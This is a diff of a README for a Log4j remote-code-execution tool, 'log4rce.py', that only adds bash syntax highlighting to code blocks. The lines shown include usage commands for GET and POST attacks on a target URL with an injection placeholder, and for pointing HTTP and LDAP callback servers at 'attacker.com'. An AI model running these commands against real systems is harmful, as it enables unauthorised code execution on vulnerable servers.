@@ -21,7 +21,7 @@ INFO:root:Done!
 
 This is a CLI tool. All options can be found in the help menu:
 
-```
+```bash
 python3 log4rce.py --help
 ```
 
@@ -37,13 +37,13 @@ You can perform an automated HTTP request attack on a target URL.
 
 You can perform a GET request as follows:
 
-```
+```bash
 python3 log4rce.py http --url "http://www.vuln.com:1234/?vuln_param=###&param=123" --headers="P1=123&P2=123"
 ```
 
 You can perform a POST request as follows:
 
-```
+```bash
 python3 log4rce.py http -X POST --url "http://www.vuln.com:1234/" --data "vuln_param=###&param=123" --headers="P1=123&P2=123"
 ```
 
@@ -65,7 +65,7 @@ The tool allows extensive customization for most network configuration. All the 
 
 You can configure the HTTP server using the following parameters:
 
-```
+```bash
 python3 log4rce.py --http_port 1234 --http_rport 12345 --http_host "attacker.com"
 ```
 
@@ -79,7 +79,7 @@ http_host: The host name/IP a remote machine accesses.
 
 You can configure the LDAP server using the following parameters:
 
-```
+```bash
 python3 log4rce.py --ldap_port 1234 --ldap_rport 12345 --ldap_host "attacker.com"
 ```
 
